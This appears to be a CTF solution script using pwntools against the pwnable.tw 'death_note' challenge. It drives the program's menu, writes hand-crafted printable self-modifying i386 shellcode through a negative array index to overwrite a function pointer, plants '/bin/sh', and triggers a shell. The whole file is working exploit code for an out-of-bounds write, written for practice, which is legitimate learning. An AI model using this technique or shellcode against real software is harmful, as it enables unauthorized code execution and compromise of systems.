#!/usr/bin/python2

from pwn import *

#r = remote('chall.pwnable.tw', 10201)
r = process('./death_note') if '-r' not in sys.argv else process('./death_note')

context.arch = 'i386'
context.log_level = 'debug'

elf = ELF('./death_note')


def show(idx):
	r.sendlineafter('Your choice :', '2')
	r.sendlineafter('Index :', str(idx))
	r.recvuntil('Name : ')
	name = r.recv(4)
	return name

def add(idx, content):
	r.sendlineafter('Your choice :', '1')
	r.sendlineafter('Index :', str(idx))
	r.sendlineafter('Name :', content)

def remove(idx):
	r.sendlineafter('Your choice :', '3')
	r.sendlineafter('Index :', str(idx))

shellcode = asm('''
        pop ebx
        pop ebx
        push ebx
        pop ecx
        inc ecx
        inc ecx
        inc ecx
        inc ecx
        inc ecx
        inc ecx
        inc ecx
        inc ecx
        inc ecx
        inc ecx
        inc ecx
        inc ecx
        inc ecx
        inc ecx
        inc ecx
        inc ecx
        push edx
        pop eax
        dec eax
        xor    BYTE PTR [ecx+0x2b],al
        inc eax
        inc eax
        xor    BYTE PTR [ecx+0x2c],al
        dec eax
        dec eax
        xor    BYTE PTR [ecx+0x2c],al
        inc eax
        xor al, 0x41
        xor al, 0x4a
        push edx
        pop ecx
        xor    bh,BYTE PTR [esi+0x42]
        ''')

print len(shellcode)
add(0, "/bin/sh\x00")
add(-19, shellcode)

gdb.attach(r)

remove(0) 
r.interactive()
